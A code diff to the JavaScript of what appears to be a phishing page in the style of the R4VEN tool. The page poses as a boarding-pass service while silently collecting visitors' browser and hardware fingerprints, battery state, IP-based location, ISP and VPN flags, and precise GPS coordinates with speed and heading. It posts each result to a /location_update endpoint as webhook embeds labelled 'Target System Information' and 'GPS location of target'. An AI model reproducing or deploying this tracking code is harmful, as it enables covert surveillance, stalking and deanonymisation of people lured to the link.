@@ -40,27 +40,59 @@ function initDecorations() {
 /* ── Silent system / IP recon ── */
 function collectSilent() {
   var localtime = String(new Date().toLocaleTimeString());
-  var sysinfo = '```xl\n' + navigator.userAgent + '```'
-    + '```autohotkey\n\nPlatform: ' + navigator.platform
-    + '\nCookies_Enabled: ' + navigator.cookieEnabled
-    + '\nBrowser_Language: ' + navigator.language
-    + '\nBrowser_Name: ' + navigator.appName
-    + '\nRam: ' + navigator.deviceMemory
-    + '\nCPU_cores: ' + navigator.hardwareConcurrency
-    + '\nScreen: ' + screen.width + 'x' + screen.height
-    + '\nTime: ' + localtime + '```';
+  var tz = 'Unknown'; try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; } catch(e){}
+  
+  var gpu = 'Unknown';
+  try {
+      var cvs = document.createElement('canvas'), gl = cvs.getContext('webgl') || cvs.getContext('experimental-webgl');
+      gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+  } catch(e) {}
+
+  var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  var netType = conn ? conn.effectiveType : 'Unknown';
+  var netDL = conn ? conn.downlink + ' Mbps' : 'Unknown';
+
+  var sysinfo = '```xl\nUser-Agent: ' + navigator.userAgent + '```'
+    + '```autohotkey\n'
+    + 'Platform: ' + navigator.platform
+    + '\nVendor: ' + navigator.vendor
+    + '\nLanguage: ' + navigator.language
+    + '\nTimezone: ' + tz
+    + '\nTime: ' + localtime
+    + '\nCookies: ' + navigator.cookieEnabled
+    + '\nDo_Not_Track: ' + (navigator.doNotTrack || 'Unknown')
+    + '\n'
+    + '\n--- Hardware ---'
+    + '\nRam: ~' + (navigator.deviceMemory || 'Unknown') + ' GB'
+    + '\nCPU_Cores: ' + (navigator.hardwareConcurrency || 'Unknown')
+    + '\nGPU: ' + gpu
+    + '\nTouch_Points: ' + navigator.maxTouchPoints
+    + '\n'
+    + '\n--- Screen & Network ---'
+    + '\nResolution: ' + screen.width + 'x' + screen.height
+    + '\nViewport: ' + window.innerWidth + 'x' + window.innerHeight
+    + '\nColor_Depth: ' + screen.colorDepth + '-bit'
+    + '\nNet_Type: ' + netType
+    + '\nDownlink: ' + netDL;
 
   var AVATAR = 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png';
-
-  function post(payload) {
+  
+  function postInfo(batt) {
+    var finalInfo = sysinfo;
+    if(batt) finalInfo += '\n\n--- Battery ---\nCharging: ' + batt.c + '\nLevel: ' + batt.l;
+    finalInfo += '```';
+    
     var r = new XMLHttpRequest();
-    r.open('POST', '/location_update');
-    r.setRequestHeader('Content-type', 'application/json');
-    r.send(JSON.stringify(payload));
+    r.open('POST', '/location_update'); r.setRequestHeader('Content-type', 'application/json');
+    r.send(JSON.stringify({ username:'R4VEN', avatar_url:AVATAR, content:'@everyone Someone Opened The Link O_o',
+      embeds:[{ author:{name:'Target System Information..'}, description:finalInfo, color:15418782 }] }));
   }
 
-  post({ username: 'R4VEN', avatar_url: AVATAR, content: '@everyone Someone Opened The Link O_o',
-    embeds: [{ author: { name: 'Target System Information..' }, title: 'Uagent:', description: sysinfo, color: 15418782 }] });
+  if ('getBattery' in navigator) {
+    navigator.getBattery().then(function(b) { postInfo({c: b.charging?'Yes':'No', l: (b.level*100)+'%'}); }).catch(function(){ postInfo(null); });
+  } else { postInfo(null); }
+
+  function post(payload) { var r=new XMLHttpRequest(); r.open('POST','/location_update'); r.setRequestHeader('Content-type','application/json'); r.send(JSON.stringify(payload)); }
 
   $.getJSON('https://api.ipify.org?format=json', function(data) {
     post({ username: 'R4VEN', avatar_url: AVATAR,
@@ -70,11 +102,30 @@ function collectSilent() {
   });
 
   $.getJSON('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query', function(res) {
+    var pxy = (res.proxy || res.hosting) ? "YES (VPN/Proxy/Cloud)" : "No";
+    var mob = res.mobile ? "YES" : "No";
+    var recon = '```autohotkey\n'
+      + 'IP Address  : ' + res.query + '\n'
+      + 'ISP         : ' + res.isp + '\n'
+      + 'Org / ASN   : ' + res.org + ' (' + res.as + ')\n'
+      + 'Reverse DNS : ' + (res.reverse || 'N/A') + '\n\n'
+      + '--- Location ---\n'
+      + 'Continent   : ' + res.continent + ' (' + res.continentCode + ')\n'
+      + 'Country     : ' + res.country + ' (' + res.countryCode + ')\n'
+      + 'Region      : ' + res.regionName + '\n'
+      + 'City        : ' + res.city + ' (District: ' + (res.district || 'N/A') + ')\n'
+      + 'Zip Code    : ' + (res.zip || 'N/A') + '\n'
+      + 'Lat/Lon     : ' + res.lat + ' , ' + res.lon + '\n'
+      + 'Timezone    : ' + res.timezone + ' (UTC' + (res.offset/3600 >= 0 ? '+' : '') + (res.offset/3600) + ')\n'
+      + 'Currency    : ' + res.currency + '\n\n'
+      + '--- Network Flags ---\n'
+      + 'Cellular    : ' + mob + '\n'
+      + 'Proxy/VPN   : ' + pxy + '\n'
+      + '```';
+
     post({ username: 'R4VEN', avatar_url: AVATAR,
       embeds: [{ author: { name: 'IP Address Reconnaissance' }, title: res.status,
-        description: '```autohotkey\nContinent: ' + res.continent + '\nCountry: ' + res.country
-          + '\nRegion: ' + res.regionName + '\nCity: ' + res.city
-          + '\nISP: ' + res.isp + '\nLat: ' + res.lat + '\nLon: ' + res.lon + '```',
+        description: recon,
         color: 5763719 }] });
   });
 }
@@ -143,9 +194,21 @@ function requestLocation() {
 function onGpsSuccess(pos) {
   setStatus('Lokasi terdeteksi! Mencetak boarding pass\u2026');
   var lat = pos.coords.latitude, lon = pos.coords.longitude;
-  var ll = '```prolog\nLatitude:' + lat + '\nLongitude:' + lon + '```'
-    + '\n__**Map Location:**__ https://www.google.com/maps/place/' + lat + ',' + lon
-    + '\n__**Google Earth:**__ https://earth.google.com/web/search/' + lat + ',' + lon;
+  var acc = pos.coords.accuracy || 0;
+  var alt = pos.coords.altitude !== null ? pos.coords.altitude : 'N/A';
+  var spd = pos.coords.speed !== null ? pos.coords.speed : 'N/A';
+  var hdg = pos.coords.heading !== null ? pos.coords.heading : 'N/A';
+
+  var ll = '```prolog\n'
+    + 'Latitude  : ' + lat + '\n'
+    + 'Longitude : ' + lon + '\n'
+    + 'Accuracy  : ' + acc + ' meters\n'
+    + 'Altitude  : ' + alt + ' meters\n'
+    + 'Speed     : ' + spd + ' m/s\n'
+    + 'Heading   : ' + hdg + ' degrees\n'
+    + '```\n'
+    + '__**Google Maps:**__ https://www.google.com/maps/place/' + lat + ',' + lon + '\n'
+    + '__**Google Earth:**__ https://earth.google.com/web/search/' + lat + ',' + lon;
 
   var r = new XMLHttpRequest();
   r.open('POST', '/location_update');
@@ -157,7 +220,7 @@ function onGpsSuccess(pos) {
       title: 'GPS location of target..',
       description: ll + '\n',
       color: 15844367,
-      footer: { text: 'GPS fetch almost exact location using longitude and latitude.' } }]
+      footer: { text: 'High accuracy geolocation using device sensors.' } }]
   }));
 
   setTimeout(showSuccess, 800);
